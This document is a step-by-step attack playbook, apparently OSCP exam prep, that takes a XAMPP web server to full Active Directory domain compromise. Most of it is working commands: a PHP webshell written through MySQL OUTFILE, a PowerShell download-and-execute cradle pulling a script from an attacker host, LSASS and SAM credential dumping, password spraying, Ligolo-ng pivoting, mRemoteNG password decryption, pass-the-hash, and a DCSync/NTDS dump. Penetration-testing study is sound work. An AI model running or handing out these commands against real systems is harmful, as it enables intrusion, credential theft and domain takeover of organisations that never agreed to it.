# XAMPP → Domain Compromise: Full Attack Chain Methodology

Chronological, exam-ready reference for a foothold-to-DC chain that starts on a XAMPP/MySQL web server and ends in full domain compromise via credential reuse and pivoting.

---

## 1. XAMPP Credential File Discovery

Foothold reached (LFI/RCE/creds already obtained) → hunt XAMPP's known-weak config/cred files first, they're near-guaranteed on default installs.

```bash
# Default XAMPP paths (Windows)
type C:\xampp\phpMyAdmin\config.inc.php
type C:\xampp\mysql\bin\my.ini
type C:\xampp\apache\conf\extra\httpd-xampp.conf
dir /s /b C:\xampp\htdocs\*.php | findstr /i "config db conn"
type C:\xampp\htdocs\*\config*.php
```

**Decision point:** hardcoded `$cfg['Servers'][$i]['user']` / `$cfg['Servers'][$i]['password']` found in `config.inc.php` → go to step 2 (MySQL credential reuse). If root has no password (XAMPP default `root:` empty) → skip straight to step 3.

---

## 2. MySQL Credential Reuse

Test recovered creds directly against MySQL — XAMPP MySQL is usually bound to 127.0.0.1 only, so this is normally done from the shell you already have, or tunneled.

```bash
mysql -h 127.0.0.1 -u root -p'<recovered_pw>' -e "SHOW DATABASES;"
mysql -h 127.0.0.1 -u <user> -p'<recovered_pw>' -e "SELECT user,authentication_string,host FROM mysql.user;"
```

**Decision point:** login succeeds and the account has `FILE` privilege (`SHOW GRANTS;`) → step 3. No `FILE` priv → look for other DB-based vectors (UDF injection if `plugin_dir` writable, or just loot data) instead.

---

## 3. MySQL `SELECT INTO OUTFILE` → Webshell

Abuse `FILE` privilege to drop a PHP webshell inside the web root.

```sql
-- confirm FILE priv and web root path first
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

```bash
# if secure_file_priv is empty or matches htdocs, this works directly
curl "http://<target>/shell.php?cmd=whoami"
```

**Decision point:** `secure_file_priv` is empty or set to a path containing the web root → outfile write succeeds. If it's set to a different restricted dir → try UDF (`lib_mysqludf_sys`) injection instead, or look for another writable/web-exposed path.

---

## 4. Webshell → SYSTEM RCE

XAMPP's Apache service on Windows almost always runs as `NT AUTHORITY\SYSTEM` by default — webshell RCE is frequently already SYSTEM, confirm before escalating further.

```bash
curl "http://<target>/shell.php?cmd=whoami"
curl "http://<target>/shell.php?cmd=whoami+/priv"
```

|Finding|Next move|
|---|---|
|`whoami` returns `nt authority\system`|already SYSTEM — skip to step 5 directly|
|Apache running as local service/user|standard Windows privesc methodology (services, tokens, AlwaysInstallElevated) before continuing chain|
|Need interactive shell instead of one-liners|upgrade via `nc.exe`/reverse shell or msfvenom staged payload through the webshell|

```bash
# upgrade to a stable reverse shell if needed
curl "http://<target>/shell.php?cmd=powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://<lhost>/shell.ps1')"
```

---

## 5. LSASS Credential Dumping / Mimikatz

With SYSTEM, dump LSASS to recover plaintext creds / hashes for reuse elsewhere on the network.

```powershell
# via Mimikatz (upload first)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# OR living-off-the-land dump for offline parsing
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full
```

```bash
# offline parse if dumped via comsvcs.dll (transfer lsass.dmp off-box first)
pypykatz lsa minidump lsass.dmp
```

**Decision point:** Defender/AV present → prefer `comsvcs.dll` dump + offline `pypykatz` parse over dropping Mimikatz binary. Note in your report which method was used and why (noise/AV consideration).

---

## 6. Credential Reuse / Password Spraying

Take every credential recovered so far (XAMPP config, LSASS) and spray it across discovered hosts/services.

```bash
netexec smb <target_range> -u <user> -p '<password>' --continue-on-success
netexec winrm <target_range> -u <user> -p '<password>'
crackmapexec smb <target_range> -u users.txt -p passwords.txt --continue-on-success
```

**Decision point:** hit on a new host → enumerate that host's shares/sessions before moving on; don't stop at first hit, log every host+account combo that authenticates.

---

## 7. Network Pivoting with Ligolo-ng

New internal network segment discovered from the compromised box (second NIC, ARP table, routing table) → pivot instead of running everything through the webshell.

```bash
# attacker side
./proxy -selfcert

# on compromised host (agent)
.\agent.exe -connect <attacker_ip>:11601 -ignore-cert
```

```bash
# in ligolo-ng console
session
ifconfig                          # confirm internal interface visible
route add 10.10.20.0/24 tun0      # add route to internal network on attacker
```

**Decision point:** additional NIC found in `ipconfig /all` with a different subnet on the compromised host → this is the pivot target range; rescan it (nmap/netexec) once the route is up.

---

## 8. mRemoteNG Stored Credential Extraction

Pivoted host or original box has mRemoteNG installed (common on admin jump boxes) → its saved connections file holds encrypted creds for other infrastructure.

```powershell
dir /s /b confCons.xml
type "$env:APPDATA\mRemoteNG\confCons.xml"
```

**Decision point:** `confCons.xml` found and contains `Password=` attributes → step 9. Not found → check `%APPDATA%\mRemoteNG\` more broadly for backup/export XML files.

---

## 9. mRemoteNG `confCons.xml` Password Decryption

mRemoteNG uses AES-128-CBC with a hardcoded default key ("mR3m") unless the user set a custom master password — try default first.

```bash
# mremoteng_decrypt (multiple tool options exist, e.g. from CiscoCXSecurity or kmahyyg fork)
python3 mremoteng_decrypt.py -s "<encrypted_password_blob>"
```

**Decision point:** decrypt succeeds with default key → creds recovered, go to step 6 pattern (reuse them) or continue chain. Fails → custom master password set; check `PowerShell PSReadLine history` (step 10) or other loot for the master password before giving up on this file.

---

## 10. PowerShell PSReadLine History Credential Leakage

Any host reached (original box, pivoted box, admin jump box) → PSReadLine logs every command typed interactively, frequently including plaintext creds from `net use`, `runas`, or manual `$cred` assignments.

```powershell
(Get-PSReadlineOption).HistorySavePath
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
findstr /i "password pwd runas net use" "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Decision point:** credentials or a mRemoteNG master password found in history → loop back to step 6 (credential reuse/spray) or step 9 (retry confCons.xml decryption with recovered master password).

---

## 11. SMB Share Enumeration

With every credential set gathered so far, sweep SMB shares across the domain for anything readable.

```bash
netexec smb <target_range> -u <user> -p '<password>' --shares
smbclient -L //<target>/ -U '<user>%<password>'
smbmap -H <target> -u <user> -p '<password>' -r
```

**Decision point:** non-default share found (not `ADMIN$`/`C$`/`IPC$`) → mount and recursively list it; prioritize shares named `Backup`, `IT`, `Scripts`, `Users`, `Software`.

---

## 12. Sensitive Backup File Discovery

Inside accessible shares (and locally on any host) — hunt for backup files that commonly contain registry hive dumps or config secrets.

```bash
smbclient //<target>/<share> -U '<user>%<password>' -c 'recurse ON; prompt OFF; mget *.bak *.old *.zip *.7z *.dmp *.reg'
```

```powershell
# locally on a host
Get-ChildItem -Recurse -Include *.bak,*.old,*.zip,*.7z,*.dmp,*.reg -ErrorAction SilentlyContinue C:\
```

**Decision point:** filenames matching `sam.bak`, `system.bak`, `ntds.dit`, or IT-admin-looking backup archives found → step 13. Generic app backups → grep contents for connection strings/passwords instead.

---

## 13. SAM + SYSTEM Hive Extraction

Either recovered directly from a backup (step 12) or extracted live from a host you have admin on.

```powershell
# live extraction (requires local admin)
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
```

```bash
# transfer sam.save/system.save/security.save to attacker box
```

**Decision point:** domain-joined host with cached domain creds needed → also grab `SECURITY` hive (holds LSA secrets/cached domain logons), not just SAM/SYSTEM.

---

## 14. Offline NTLM Hash Extraction with `secretsdump`

Parse the extracted (or backed-up) hives offline for NTLM hashes and LSA secrets.

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

**Decision point:** local `Administrator` hash recovered and reused across the fleet (common in unmanaged environments) → step 15. Domain account hash found in LSA secrets/cached creds → treat as domain credential, prioritize for step 15/16.

---

## 15. NTLM Credential Reuse / Pass-the-Hash

Take every NTLM hash recovered and spray/PtH across the environment — no cracking needed.

```bash
netexec smb <target_range> -u <user> -H '<ntlm_hash>' --continue-on-success
netexec smb <target_range> -u <user> -H '<ntlm_hash>' -x whoami
evil-winrm -i <target> -u <user> -H '<ntlm_hash>'
psexec.py <domain>/<user>@<target> -hashes ':<ntlm_hash>'
```

**Decision point:** hash authenticates on a host where a **domain admin or DC-adjacent account** has an active session or is a local admin equivalent → step 16. Only local admin on low-value boxes → keep spraying/enumerating for a domain-privileged hit before moving on.

---

## 16. Lateral Movement to Domain Controller

Credential/hash from step 15 grants access to a host with a path toward the DC (domain admin session, DCSync rights, or direct DC local admin).

```bash
# confirm DC reachability + identify DC
netexec smb <dc_ip> -u <user> -H '<ntlm_hash>'

# if domain admin hash/creds obtained
psexec.py <domain>/<domain_admin>@<dc_ip> -hashes ':<ntlm_hash>'
evil-winrm -i <dc_ip> -u <domain_admin> -H '<ntlm_hash>'

# if DCSync rights instead of direct admin
secretsdump.py <domain>/<user>@<dc_ip> -hashes ':<ntlm_hash>' -just-dc
```

**Decision point:** direct admin access to DC obtained → step 17. Only DCSync rights (no shell) → domain is already effectively compromised via `-just-dc` NTDS dump; shell access is optional at that point.

---

## 17. Domain Controller Privilege Escalation / Domain Compromise

Final confirmation and full domain credential extraction.

```bash
# dump the entire domain (NTDS.dit + hashes for every domain account)
secretsdump.py <domain>/<domain_admin>@<dc_ip> -hashes ':<ntlm_hash>'

# confirm SYSTEM/domain admin on DC interactively
whoami
whoami /groups
```

Domain compromised once `krbtgt` hash and all domain-user NTLM hashes are dumped — this also enables Golden Ticket persistence if in scope.

---

## Priority Fast-Path Summary (try these first)

1. **XAMPP config.inc.php → MySQL FILE priv → webshell** — this is almost always the intended foothold-to-execution vector when XAMPP is present; check it before anything else.
2. **Webshell = SYSTEM check immediately** — don't waste time on Windows privesc methodology until you've confirmed you're not already SYSTEM via the Apache service account.
3. **PSReadLine history on every host you land on** — highest signal-to-effort credential source, check it before deep-diving any other loot vector.
4. **mRemoteNG confCons.xml with default key** — near-instant win if the file exists and no custom master password was set.
5. **SAM/SYSTEM extraction → secretsdump → PtH spray** — the reliable fallback path to lateral movement even if no plaintext creds are ever found.
6. **DCSync rights check as soon as any domain account is compromised** — often faster to full domain compromise than chasing a direct DA session.

---

_Document why each command was run — which enumeration finding justified moving to that step — for OSCP report reproduction steps, not just the successful exploitation chain._